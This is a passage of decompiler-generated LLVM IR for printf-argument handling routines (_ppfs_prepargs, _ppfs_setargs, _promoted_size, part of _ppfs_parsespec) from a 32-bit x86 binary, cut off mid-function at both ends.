  %v0_804e51f.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804e51f

dec_label_pc_804e51f:                             ; preds = %dec_label_pc_804e519.dec_label_pc_804e51f_crit_edge, %dec_label_pc_804e4ee
  %v0_804e51f = phi i32 [ %v0_804e51f.pre, %dec_label_pc_804e519.dec_label_pc_804e51f_crit_edge ], [ %v0_804e4ee, %dec_label_pc_804e4ee ]
  %v1_804e51f = load i32, i32* @ebx, align 4
  %v2_804e51f = inttoptr i32 %v1_804e51f to i32*
  store i32 %v0_804e51f, i32* %v2_804e51f, align 4
  br label %dec_label_pc_804e523

dec_label_pc_804e523:                             ; preds = %dec_label_pc_804e502, %dec_label_pc_804e51f
  %storemerge = phi i32 [ 0, %dec_label_pc_804e51f ], [ -1, %dec_label_pc_804e502 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v2_804e523 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804e523, i32* @edx, align 4
  %v2_804e524 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804e524, i32* @ebx, align 4
  store i32 %v0_804e4b8, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v6_804e519, { 1, 0 }
  uselistorder i8 %v2_804e519, { 1, 2, 0 }
  uselistorder i32 %v0_804e4fc.be, { 2, 1, 0 }
  uselistorder i32 %v0_804e4fc27, { 1, 0 }
  uselistorder i32 %v0_804e4ee, { 1, 0, 2, 3 }
  uselistorder i32 %v1_804e4eb, { 0, 2, 1 }
  uselistorder i32 %v1_804e4e8, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 0, 4, 1, 2, 3 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 8, 4, 5, 6, 7 }
  uselistorder label %dec_label_pc_804e523, { 1, 0 }
  uselistorder label %dec_label_pc_804e4f7, { 1, 0 }
}

define i32 @_ppfs_prepargs(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v0_804e528 = load i32, i32* @esi, align 4
  %v0_804e529 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_804e535 = add i32 %arg1, 24
  %v2_804e535 = inttoptr i32 %v1_804e535 to i32*
  %v3_804e535 = load i32, i32* %v2_804e535, align 4
  %v2_804e538 = add i32 %arg1, 76
  %v3_804e538 = inttoptr i32 %v2_804e538 to i32*
  store i32 %arg2, i32* %v3_804e538, align 4
  %tmp8 = icmp slt i32 %v3_804e535, 1
  br i1 %tmp8, label %dec_label_pc_804e566, label %dec_label_pc_804e53f

dec_label_pc_804e53f:                             ; preds = %entry
  %v1_804e542 = load i32, i32* @ebx, align 4
  %v2_804e542 = add i32 %v1_804e542, 28
  %v3_804e542 = inttoptr i32 %v2_804e542 to i32*
  store i32 %v3_804e535, i32* %v3_804e542, align 4
  %v0_804e545 = load i32, i32* @ebx, align 4
  %v1_804e545 = add i32 %v0_804e545, 24
  %v2_804e545 = inttoptr i32 %v1_804e545 to i32*
  store i32 0, i32* %v2_804e545, align 4
  %v0_804e54c = load i32, i32* @ebx, align 4
  %v1_804e54c = add i32 %v0_804e54c, 4
  %v2_804e54c = inttoptr i32 %v1_804e54c to i32*
  store i32 0, i32* %v2_804e54c, align 4
  %v0_804e553 = load i32, i32* @ebx, align 4
  %v1_804e553 = add i32 %v0_804e553, 8
  %v2_804e553 = inttoptr i32 %v1_804e553 to i32*
  store i32 0, i32* %v2_804e553, align 4
  %v0_804e55a = load i32, i32* @ebx, align 4
  %v1_804e55b = call i32 @_ppfs_setargs(i32 %v0_804e55a)
  %v1_804e560 = load i32, i32* @ebx, align 4
  %v2_804e560 = add i32 %v1_804e560, 24
  %v3_804e560 = inttoptr i32 %v2_804e560 to i32*
  store i32 %v3_804e535, i32* %v3_804e560, align 4
  br label %dec_label_pc_804e566

dec_label_pc_804e566:                             ; preds = %entry, %dec_label_pc_804e53f
  %v2_804e566 = load i32, i32* %stack_var_-12, align 4
  store i32 %v0_804e529, i32* @ebx, align 4
  store i32 %v0_804e528, i32* @esi, align 4
  ret i32 %v2_804e566

; uselistorder directives
  uselistorder i32 %v3_804e535, { 1, 2, 0 }
  uselistorder i32 (i32)* @_ppfs_setargs, { 1, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804e566, { 1, 0 }
}

define i32 @_ppfs_setargs(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804e56d = load i32, i32* @ebx, align 4
  store i32 %v0_804e56d, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* @ecx, align 4
  %v1_804e572 = add i32 %arg1, 80
  store i32 %v1_804e572, i32* %ebx.global-to-local, align 4
  %v1_804e575 = add i32 %arg1, 24
  %v2_804e575 = inttoptr i32 %v1_804e575 to i32*
  %v3_804e575 = load i32, i32* %v2_804e575, align 4
  %v4_804e575 = icmp eq i32 %v3_804e575, 0
  %v1_804e579 = icmp eq i1 %v4_804e575, false
  %v1_804e62f = add i32 %arg1, 8
  %v2_804e62f = inttoptr i32 %v1_804e62f to i32*
  %v3_804e62f = load i32, i32* %v2_804e62f, align 4
  %v8_804e62f = icmp eq i32 %v3_804e62f, -2147483648
  %v1_804e636 = icmp eq i1 %v8_804e62f, false
  br i1 %v1_804e579, label %dec_label_pc_804e62f, label %dec_label_pc_804e57f

dec_label_pc_804e57f:                             ; preds = %entry
  br i1 %v1_804e636, label %dec_label_pc_804e599, label %dec_label_pc_804e588

dec_label_pc_804e588:                             ; preds = %dec_label_pc_804e57f
  %v1_804e588 = add i32 %arg1, 76
  %v2_804e588 = inttoptr i32 %v1_804e588 to i32*
  %v3_804e588 = load i32, i32* %v2_804e588, align 4
  store i32 %v3_804e588, i32* %eax.global-to-local, align 4
  %v1_804e58b = add i32 %v3_804e588, 4
  store i32 %v1_804e58b, i32* %edx.global-to-local, align 4
  store i32 %v1_804e58b, i32* %v2_804e588, align 4
  %v0_804e591 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e591 = inttoptr i32 %v0_804e591 to i32*
  %v2_804e591 = load i32, i32* %v1_804e591, align 4
  store i32 %v2_804e591, i32* %eax.global-to-local, align 4
  %v1_804e593 = load i32, i32* @ecx, align 4
  %v2_804e593 = add i32 %v1_804e593, 80
  %v3_804e593 = inttoptr i32 %v2_804e593 to i32*
  store i32 %v2_804e591, i32* %v3_804e593, align 4
  %v0_804e596 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e596 = load i32, i32* @ecx, align 4
  %v2_804e596 = add i32 %v1_804e596, 8
  %v3_804e596 = inttoptr i32 %v2_804e596 to i32*
  store i32 %v0_804e596, i32* %v3_804e596, align 4
  %v0_804e599.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804e599

dec_label_pc_804e599:                             ; preds = %dec_label_pc_804e57f, %dec_label_pc_804e588
  %v1_804e5a8 = phi i32 [ %arg1, %dec_label_pc_804e57f ], [ %v0_804e599.pre, %dec_label_pc_804e588 ]
  %v1_804e599 = add i32 %v1_804e5a8, 4
  %v2_804e599 = inttoptr i32 %v1_804e599 to i32*
  %v3_804e599 = load i32, i32* %v2_804e599, align 4
  %v8_804e599 = icmp eq i32 %v3_804e599, -2147483648
  %v1_804e5a0 = icmp eq i1 %v8_804e599, false
  br i1 %v1_804e5a0, label %dec_label_pc_804e5b3, label %dec_label_pc_804e5a2

dec_label_pc_804e5a2:                             ; preds = %dec_label_pc_804e599
  %v1_804e5a2 = add i32 %v1_804e5a8, 76
  %v2_804e5a2 = inttoptr i32 %v1_804e5a2 to i32*
  %v3_804e5a2 = load i32, i32* %v2_804e5a2, align 4
  store i32 %v3_804e5a2, i32* %eax.global-to-local, align 4
  %v1_804e5a5 = add i32 %v3_804e5a2, 4
  store i32 %v1_804e5a5, i32* %edx.global-to-local, align 4
  store i32 %v1_804e5a5, i32* %v2_804e5a2, align 4
  %v0_804e5ab = load i32, i32* %eax.global-to-local, align 4
  %v1_804e5ab = inttoptr i32 %v0_804e5ab to i32*
  %v2_804e5ab = load i32, i32* %v1_804e5ab, align 4
  store i32 %v2_804e5ab, i32* %eax.global-to-local, align 4
  %v1_804e5ad = load i32, i32* @ecx, align 4
  %v2_804e5ad = add i32 %v1_804e5ad, 80
  %v3_804e5ad = inttoptr i32 %v2_804e5ad to i32*
  store i32 %v2_804e5ab, i32* %v3_804e5ad, align 4
  %v0_804e5b0 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e5b0 = load i32, i32* @ecx, align 4
  %v2_804e5b0 = add i32 %v1_804e5b0, 4
  %v3_804e5b0 = inttoptr i32 %v2_804e5b0 to i32*
  store i32 %v0_804e5b0, i32* %v3_804e5b0, align 4
  %v1_804e62817.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804e5b3

dec_label_pc_804e5b3:                             ; preds = %dec_label_pc_804e599, %dec_label_pc_804e5a2
  %v1_804e62817 = phi i32 [ %v1_804e5a8, %dec_label_pc_804e599 ], [ %v1_804e62817.pre, %dec_label_pc_804e5a2 ]
  store i32 0, i32* %esi.global-to-local, align 4
  %v2_804e62818 = add i32 %v1_804e62817, 28
  %v3_804e62819 = inttoptr i32 %v2_804e62818 to i32*
  %v4_804e62820 = load i32, i32* %v3_804e62819, align 4
  %v5_804e62b21 = icmp sgt i32 %v4_804e62820, 0
  br i1 %v5_804e62b21, label %dec_label_pc_804e5b7, label %dec_label_pc_804e65d.loopexit

dec_label_pc_804e5b7:                             ; preds = %dec_label_pc_804e5b3, %dec_label_pc_804e627
  %v1_804e62823 = phi i32 [ %v1_804e628, %dec_label_pc_804e627 ], [ %v1_804e62817, %dec_label_pc_804e5b3 ]
  %v1_804e5b722 = phi i32 [ %v1_804e627, %dec_label_pc_804e627 ], [ 0, %dec_label_pc_804e5b3 ]
  %v2_804e5b7 = mul i32 %v1_804e5b722, 4
  %v3_804e5b7 = add i32 %v2_804e5b7, 40
  %v4_804e5b7 = add i32 %v3_804e5b7, %v1_804e62823
  %v5_804e5b7 = inttoptr i32 %v4_804e5b7 to i32*
  %v6_804e5b7 = load i32, i32* %v5_804e5b7, align 4
  store i32 %v6_804e5b7, i32* %eax.global-to-local, align 4
  %v1_804e5bb = add i32 %v6_804e5b7, -8
  %v9_804e5bb = icmp eq i32 %v1_804e5bb, 0
  br i1 %v9_804e5bb, label %dec_label_pc_804e627, label %dec_label_pc_804e5c0

dec_label_pc_804e5c0:                             ; preds = %dec_label_pc_804e5b7
  %v10_804e5bb = icmp slt i32 %v1_804e5bb, 0
  %v6_804e5bb = sub i32 7, %v6_804e5b7
  %v7_804e5bb = and i32 %v6_804e5bb, %v6_804e5b7
  %v8_804e5bb = icmp slt i32 %v7_804e5bb, 0
  %v1_804e5c0 = add i32 %v1_804e62823, 76
  %v2_804e5c0 = inttoptr i32 %v1_804e5c0 to i32*
  %v3_804e5c0 = load i32, i32* %v2_804e5c0, align 4
  store i32 %v3_804e5c0, i32* %edx.global-to-local, align 4
  %v3_804e5c3 = icmp eq i1 %v10_804e5bb, %v8_804e5bb
  br i1 %v3_804e5c3, label %dec_label_pc_804e5d3, label %dec_label_pc_804e5c5

dec_label_pc_804e5c5:                             ; preds = %dec_label_pc_804e5c0
  %tmp15 = icmp slt i32 %v6_804e5b7, 3
  %v9_804e5cc = icmp eq i32 %v6_804e5b7, 7
  %v1_804e5cf = icmp eq i1 %v9_804e5cc, false
  %or.cond = or i1 %tmp15, %v1_804e5cf
  br i1 %or.cond, label %dec_label_pc_804e61a, label %dec_label_pc_804e5fc

dec_label_pc_804e5d3:                             ; preds = %dec_label_pc_804e5c0
  %tmp16 = icmp sgt i32 %v6_804e5b7, 1024
  br i1 %tmp16, label %dec_label_pc_804e5dc, label %dec_label_pc_804e61a

dec_label_pc_804e5dc:                             ; preds = %dec_label_pc_804e5d3
  %v6_804e5dc = icmp eq i32 %v6_804e5b7, 2048
  br i1 %v6_804e5dc, label %dec_label_pc_804e5ec, label %dec_label_pc_804e5e3

dec_label_pc_804e5e3:                             ; preds = %dec_label_pc_804e5dc
  %v9_804e5e3 = icmp eq i32 %v6_804e5b7, 2055
  %v1_804e5e8 = icmp eq i1 %v9_804e5e3, false
  br i1 %v1_804e5e8, label %dec_label_pc_804e61a, label %dec_label_pc_804e60b

dec_label_pc_804e5ec:                             ; preds = %dec_label_pc_804e5dc
  %v1_804e5ec = add i32 %v3_804e5c0, 8
  store i32 %v1_804e5ec, i32* %eax.global-to-local, align 4
  store i32 %v1_804e5ec, i32* %v2_804e5c0, align 4
  %v0_804e5f2 = load i32, i32* %edx.global-to-local, align 4
  %v1_804e5f2 = inttoptr i32 %v0_804e5f2 to i32*
  %v2_804e5f2 = load i32, i32* %v1_804e5f2, align 4
  store i32 %v2_804e5f2, i32* %eax.global-to-local, align 4
  %v1_804e5f4 = add i32 %v0_804e5f2, 4
  %v2_804e5f4 = inttoptr i32 %v1_804e5f4 to i32*
  %v3_804e5f4 = load i32, i32* %v2_804e5f4, align 4
  store i32 %v3_804e5f4, i32* %edx.global-to-local, align 4
  %v1_804e5f7 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804e5f7 = add i32 %v1_804e5f7, 4
  %v3_804e5f7 = inttoptr i32 %v2_804e5f7 to i32*
  store i32 %v3_804e5f4, i32* %v3_804e5f7, align 4
  %v0_804e622.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e622

dec_label_pc_804e5fc:                             ; preds = %dec_label_pc_804e5c5
  %v3_804e5fc = load i32, i32* %v2_804e5c0, align 4
  store i32 %v3_804e5fc, i32* %edx.global-to-local, align 4
  %v1_804e5ff = add i32 %v3_804e5fc, 8
  store i32 %v1_804e5ff, i32* %eax.global-to-local, align 4
  store i32 %v1_804e5ff, i32* %v2_804e5c0, align 4
  %v0_804e605 = load i32, i32* %edx.global-to-local, align 4
  %v1_804e605 = inttoptr i32 %v0_804e605 to double*
  %v2_804e605 = load double, double* %v1_804e605, align 4
  %v2_804e607 = load i32, i32* %ebx.global-to-local, align 4
  %v4_804e607 = inttoptr i32 %v2_804e607 to double*
  store double %v2_804e605, double* %v4_804e607, align 4
  br label %dec_label_pc_804e624

dec_label_pc_804e60b:                             ; preds = %dec_label_pc_804e5e3
  %v3_804e60b = load i32, i32* %v2_804e5c0, align 4
  store i32 %v3_804e60b, i32* %edx.global-to-local, align 4
  %v1_804e60e = add i32 %v3_804e60b, 12
  store i32 %v1_804e60e, i32* %eax.global-to-local, align 4
  store i32 %v1_804e60e, i32* %v2_804e5c0, align 4
  %v0_804e614 = load i32, i32* %edx.global-to-local, align 4
  %v1_804e614 = inttoptr i32 %v0_804e614 to x86_fp80*
  %v2_804e614 = load x86_fp80, x86_fp80* %v1_804e614, align 4
  %v2_804e616 = load i32, i32* %ebx.global-to-local, align 4
  %v3_804e616 = inttoptr i32 %v2_804e616 to x86_fp80*
  store x86_fp80 %v2_804e614, x86_fp80* %v3_804e616, align 4
  br label %dec_label_pc_804e624

dec_label_pc_804e61a:                             ; preds = %dec_label_pc_804e5c5, %dec_label_pc_804e5d3, %dec_label_pc_804e5e3
  %v1_804e61a = add i32 %v3_804e5c0, 4
  store i32 %v1_804e61a, i32* %eax.global-to-local, align 4
  store i32 %v1_804e61a, i32* %v2_804e5c0, align 4
  %v0_804e620 = load i32, i32* %edx.global-to-local, align 4
  %v1_804e620 = inttoptr i32 %v0_804e620 to i32*
  %v2_804e620 = load i32, i32* %v1_804e620, align 4
  store i32 %v2_804e620, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e622

dec_label_pc_804e622:                             ; preds = %dec_label_pc_804e5ec, %dec_label_pc_804e61a
  %v0_804e622 = phi i32 [ %v0_804e622.pre, %dec_label_pc_804e5ec ], [ %v2_804e620, %dec_label_pc_804e61a ]
  %v1_804e622 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804e622 = inttoptr i32 %v1_804e622 to i32*
  store i32 %v0_804e622, i32* %v2_804e622, align 4
  %v0_804e624.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804e624

dec_label_pc_804e624:                             ; preds = %dec_label_pc_804e60b, %dec_label_pc_804e5fc, %dec_label_pc_804e622
  %v0_804e624 = phi i32 [ %v2_804e616, %dec_label_pc_804e60b ], [ %v2_804e607, %dec_label_pc_804e5fc ], [ %v0_804e624.pre, %dec_label_pc_804e622 ]
  %v1_804e624 = add i32 %v0_804e624, 12
  store i32 %v1_804e624, i32* %ebx.global-to-local, align 4
  %v0_804e627.pre = load i32, i32* %esi.global-to-local, align 4
  %v1_804e628.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804e627

dec_label_pc_804e627:                             ; preds = %dec_label_pc_804e5b7, %dec_label_pc_804e624
  %v1_804e628 = phi i32 [ %v1_804e62823, %dec_label_pc_804e5b7 ], [ %v1_804e628.pre, %dec_label_pc_804e624 ]
  %v0_804e627 = phi i32 [ %v1_804e5b722, %dec_label_pc_804e5b7 ], [ %v0_804e627.pre, %dec_label_pc_804e624 ]
  %v1_804e627 = add i32 %v0_804e627, 1
  store i32 %v1_804e627, i32* %esi.global-to-local, align 4
  %v2_804e628 = add i32 %v1_804e628, 28
  %v3_804e628 = inttoptr i32 %v2_804e628 to i32*
  %v4_804e628 = load i32, i32* %v3_804e628, align 4
  %v5_804e62b = icmp slt i32 %v1_804e627, %v4_804e628
  br i1 %v5_804e62b, label %dec_label_pc_804e5b7, label %dec_label_pc_804e65d.loopexit

dec_label_pc_804e62f:                             ; preds = %entry
  br i1 %v1_804e636, label %dec_label_pc_804e646, label %dec_label_pc_804e638

dec_label_pc_804e638:                             ; preds = %dec_label_pc_804e62f
  %v1_804e638 = add i32 %arg1, 36
  %v2_804e638 = inttoptr i32 %v1_804e638 to i8*
  %v3_804e638 = load i8, i8* %v2_804e638, align 1
  %v2_804e63c = zext i8 %v3_804e638 to i32
  %v3_804e63c = mul nuw nsw i32 %v2_804e63c, 12
  store i32 %v3_804e63c, i32* %eax.global-to-local, align 4
  %v2_804e63f = add i32 %arg1, 68
  %v3_804e63f = add i32 %v2_804e63f, %v3_804e63c
  %v4_804e63f = inttoptr i32 %v3_804e63f to i32*
  %v5_804e63f = load i32, i32* %v4_804e63f, align 4
  store i32 %v5_804e63f, i32* %eax.global-to-local, align 4
  store i32 %v5_804e63f, i32* %v2_804e62f, align 4
  %v0_804e646.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804e646

dec_label_pc_804e646:                             ; preds = %dec_label_pc_804e62f, %dec_label_pc_804e638
  %v1_804e65a = phi i32 [ %arg1, %dec_label_pc_804e62f ], [ %v0_804e646.pre, %dec_label_pc_804e638 ]
  %v1_804e646 = add i32 %v1_804e65a, 4
  %v2_804e646 = inttoptr i32 %v1_804e646 to i32*
  %v3_804e646 = load i32, i32* %v2_804e646, align 4
  %v8_804e646 = icmp eq i32 %v3_804e646, -2147483648
  %v1_804e64d = icmp eq i1 %v8_804e646, false
  br i1 %v1_804e64d, label %dec_label_pc_804e65d, label %dec_label_pc_804e64f

dec_label_pc_804e64f:                             ; preds = %dec_label_pc_804e646
  %v1_804e64f = add i32 %v1_804e65a, 37
  %v2_804e64f = inttoptr i32 %v1_804e64f to i8*
  %v3_804e64f = load i8, i8* %v2_804e64f, align 1
  %v2_804e653 = zext i8 %v3_804e64f to i32
  %v3_804e653 = mul nuw nsw i32 %v2_804e653, 12
  store i32 %v3_804e653, i32* %eax.global-to-local, align 4
  %v1_804e656 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804e656 = add nsw i32 %v3_804e653, -12
  %v3_804e656 = add i32 %v2_804e656, %v1_804e656
  %v4_804e656 = inttoptr i32 %v3_804e656 to i32*
  %v5_804e656 = load i32, i32* %v4_804e656, align 4
  store i32 %v5_804e656, i32* %eax.global-to-local, align 4
  store i32 %v5_804e656, i32* %v2_804e646, align 4
  %v0_804e65d.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804e65d

dec_label_pc_804e65d.loopexit:                    ; preds = %dec_label_pc_804e627, %dec_label_pc_804e5b3
  %v1_804e628.lcssa = phi i32 [ %v1_804e62817, %dec_label_pc_804e5b3 ], [ %v1_804e628, %dec_label_pc_804e627 ]
  br label %dec_label_pc_804e65d

dec_label_pc_804e65d:                             ; preds = %dec_label_pc_804e65d.loopexit, %dec_label_pc_804e646, %dec_label_pc_804e64f
  %v10_804e664 = phi i32 [ %v1_804e628.lcssa, %dec_label_pc_804e65d.loopexit ], [ %v1_804e65a, %dec_label_pc_804e646 ], [ %v0_804e65d.pre, %dec_label_pc_804e64f ]
  %v1_804e65d = add i32 %v10_804e664, 8
  %v2_804e65d = inttoptr i32 %v1_804e65d to i32*
  %v3_804e65d = load i32, i32* %v2_804e65d, align 4
  store i32 %v3_804e65d, i32* %eax.global-to-local, align 4
  %v2_804e660 = icmp slt i32 %v3_804e65d, 0
  %v1_804e662 = icmp eq i1 %v2_804e660, false
  br i1 %v1_804e662, label %dec_label_pc_804e678, label %dec_label_pc_804e664

dec_label_pc_804e664:                             ; preds = %dec_label_pc_804e65d
  %v1_804e664 = add i32 %v10_804e664, 16
  %v2_804e664 = inttoptr i32 %v1_804e664 to i32*
  %v3_804e664 = load i32, i32* %v2_804e664, align 4
  %v4_804e664 = or i32 %v3_804e664, 8
  store i32 %v4_804e664, i32* %v2_804e664, align 4
  %v0_804e668 = load i32, i32* @ecx, align 4
  %v1_804e668 = add i32 %v0_804e668, 16
  %v2_804e668 = inttoptr i32 %v1_804e668 to i32*
  %v3_804e668 = load i32, i32* %v2_804e668, align 4
  %v4_804e668 = and i32 %v3_804e668, -2
  store i32 %v4_804e668, i32* %v2_804e668, align 4
  %v0_804e66c = load i32, i32* %eax.global-to-local, align 4
  %v1_804e66c = sub i32 0, %v0_804e66c
  store i32 %v1_804e66c, i32* %eax.global-to-local, align 4
  %v1_804e66e = load i32, i32* @ecx, align 4
  %v2_804e66e = add i32 %v1_804e66e, 8
  %v3_804e66e = inttoptr i32 %v2_804e66e to i32*
  store i32 %v1_804e66c, i32* %v3_804e66e, align 4
  %v0_804e671 = load i32, i32* @ecx, align 4
  %v1_804e671 = add i32 %v0_804e671, 20
  %v2_804e671 = inttoptr i32 %v1_804e671 to i32*
  store i32 32, i32* %v2_804e671, align 4
  %v0_804e67a.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e678

dec_label_pc_804e678:                             ; preds = %dec_label_pc_804e65d, %dec_label_pc_804e664
  %v0_804e67a = phi i32 [ %v3_804e65d, %dec_label_pc_804e65d ], [ %v0_804e67a.pre, %dec_label_pc_804e664 ]
  %v2_804e678 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804e678, i32* @ebx, align 4
  ret i32 %v0_804e67a

; uselistorder directives
  uselistorder i32 %v3_804e653, { 1, 0 }
  uselistorder i32 %v3_804e63c, { 1, 0 }
  uselistorder i32 %v1_804e627, { 2, 1, 0 }
  uselistorder i32 %v1_804e628, { 0, 2, 1 }
  uselistorder i32 %v3_804e5c0, { 1, 0, 2 }
  uselistorder i32* %v2_804e5c0, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder i32 %v1_804e5bb, { 1, 0 }
  uselistorder i32 %v6_804e5b7, { 3, 4, 5, 2, 1, 0, 7, 6, 8 }
  uselistorder i32 %v1_804e5b722, { 1, 0 }
  uselistorder i1 %v1_804e636, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 5, 0, 1, 2, 3, 4, 6, 7, 8, 9 }
  uselistorder i32* %ebx.global-to-local, { 1, 0, 6, 2, 3, 4, 5, 7 }
  uselistorder i32 -12, { 32, 6, 7, 1, 2, 3, 4, 5, 8, 9, 0, 10, 19, 13, 12, 14, 11, 15, 16, 17, 18, 34, 33, 35, 24, 22, 20, 21, 23, 25, 26, 27, 28, 29, 30, 31 }
  uselistorder i32 37, { 1, 2, 0 }
  uselistorder i32 7, { 0, 5, 6, 7, 8, 9, 10, 11, 1, 3, 4, 2 }
  uselistorder i32 -8, { 27, 5, 6, 0, 1, 2, 3, 4, 7, 8, 9, 10, 19, 13, 12, 14, 11, 15, 16, 17, 18, 28, 29, 30, 20, 21, 22, 23, 24, 25, 26 }
  uselistorder i32 76, { 2, 3, 4, 5, 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 2, 3, 4, 5, 8, 7, 6 }
  uselistorder label %dec_label_pc_804e678, { 1, 0 }
  uselistorder label %dec_label_pc_804e65d, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804e646, { 1, 0 }
  uselistorder label %dec_label_pc_804e627, { 1, 0 }
  uselistorder label %dec_label_pc_804e624, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804e622, { 1, 0 }
  uselistorder label %dec_label_pc_804e61a, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804e5b7, { 1, 0 }
  uselistorder label %dec_label_pc_804e5b3, { 1, 0 }
  uselistorder label %dec_label_pc_804e599, { 1, 0 }
}

define i32 @_promoted_size(i32 %arg1) local_unnamed_addr {
entry:
  %v0_804e67c = load i32, i32* @eax, align 4
  br label %dec_label_pc_804e683

dec_label_pc_804e683:                             ; preds = %dec_label_pc_804e683, %entry
  %v0_804e683 = phi i32 [ ptrtoint (i8** @global_var_8050a12.117 to i32), %entry ], [ %v1_804e683, %dec_label_pc_804e683 ]
  %v1_804e683 = add i32 %v0_804e683, -2
  %v1_804e686 = inttoptr i32 %v1_804e683 to i16*
  %v2_804e686 = load i16, i16* %v1_804e686, align 2
  %v3_804e686 = sext i16 %v2_804e686 to i32
  %v12_804e689 = icmp ne i32 %v3_804e686, %v0_804e67c
  %v6_804e693 = icmp ugt i32 %v1_804e683, ptrtoint (i32* @global_var_80509fa.118 to i32)
  %or.cond = and i1 %v6_804e693, %v12_804e689
  br i1 %or.cond, label %dec_label_pc_804e683, label %dec_label_pc_804e695

dec_label_pc_804e695:                             ; preds = %dec_label_pc_804e683
  %.pre = add i32 %v0_804e683, -134547964
  %v2_804e69b = sdiv i32 %.pre, 2
  store i32 %v2_804e69b, i32* @edx, align 4
  %v1_804e69d = add i32 %v2_804e69b, ptrtoint (i8** @global_var_8050a12.117 to i32)
  %v2_804e69d = inttoptr i32 %v1_804e69d to i8*
  %v3_804e69d = load i8, i8* %v2_804e69d, align 1
  %v4_804e69d = zext i8 %v3_804e69d to i32
  ret i32 %v4_804e69d

; uselistorder directives
  uselistorder i32 %v2_804e69b, { 1, 0 }
  uselistorder i32 %v1_804e683, { 1, 2, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_8050a12.117 to i32), { 1, 0 }
}

define i32 @_ppfs_parsespec(i32* %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp66 = call i32 @__decompiler_undefined_function_0()
  %tmp76 = ptrtoint i32* %arg1 to i32
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-71 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804e6a6 = load i32, i32* @edi, align 4
  %v0_804e6a7 = load i32, i32* @esi, align 4
  %v0_804e6a8 = load i32, i32* @ebx, align 4
  store i32 %v0_804e6a8, i32* %stack_var_-16, align 4
  %v4_804e6a8 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  store i32 %tmp76, i32* %edx.global-to-local, align 4
  %v1_804e6d4 = add i32 %tmp76, 24
  %v2_804e6d4 = inttoptr i32 %v1_804e6d4 to i32*
  %v3_804e6d4 = load i32, i32* %v2_804e6d4, align 4
  store i32 %v3_804e6d4, i32* %eax.global-to-local, align 4
  %v1_804e6db = add i32 %tmp76, 16
  %v2_804e6db = inttoptr i32 %v1_804e6db to i32*
  %v3_804e6db = load i32, i32* %v2_804e6db, align 4
  %v1_804e6de = and i32 %v3_804e6db, 128
  %v2_804e6de = icmp eq i32 %v1_804e6de, 0
  store i32 %v1_804e6de, i32* %edi.global-to-local, align 4
  %v1_804e6e4 = icmp eq i1 %v2_804e6de, false
  br i1 %v1_804e6e4, label %dec_label_pc_804e6f7, label %dec_label_pc_804e6e6

dec_label_pc_804e6e6:                             ; preds = %entry
  %v2_804e6e6 = load i32, i32* %arg1, align 4
  br label %dec_label_pc_804e744.outer

dec_label_pc_804e6f1:                             ; preds = %dec_label_pc_804e87f
  %v1_804e6f1 = add i32 %v0_804e87f.pre.pre, 1
  store i32 %v1_804e6f1, i32* @esi, align 4
  br label %dec_label_pc_804e88f

dec_label_pc_804e6f7:                             ; preds = %entry
  %v15_804e6a9 = ptrtoint i32* %stack_var_-108 to i32
  store i32 0, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804e6f9

dec_label_pc_804e6f9:                             ; preds = %dec_label_pc_804e721.dec_label_pc_804e6f9_crit_edge, %dec_label_pc_804e6f7
  %v2_804e70a = phi i32 [ %v2_804e70a.pre, %dec_label_pc_804e721.dec_label_pc_804e6f9_crit_edge ], [ %v15_804e6a9, %dec_label_pc_804e6f7 ]
  %v3_804e70a = phi i32 [ %v1_804e721, %dec_label_pc_804e721.dec_label_pc_804e6f9_crit_edge ], [ 0, %dec_label_pc_804e6f7 ]
  store i32 %tmp76, i32* %eax.global-to-local, align 4
